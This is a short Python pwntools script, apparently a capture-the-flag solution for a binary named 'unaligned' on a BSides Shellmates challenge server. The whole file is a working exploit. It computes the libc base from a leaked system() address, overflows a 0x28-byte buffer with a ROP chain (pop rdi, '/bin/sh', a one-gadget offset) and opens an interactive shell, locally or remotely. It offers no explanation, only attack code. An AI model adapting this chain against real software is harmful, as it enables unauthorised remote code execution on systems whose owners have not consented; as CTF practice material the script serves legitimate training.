#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("unaligned_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "unaligned.bsides.shellmates.club", "443"

if args.REMOTE:
  p = remote(host,port,ssl=True)
else:
  p = process([exe.path])

libc.address = int(rcu(': ', '\n'),16) - libc.sym['system']
logbase()

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b'B'*0x28+p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.address+0x4ee92)
sa('Name: ', payload)
p.interactive()

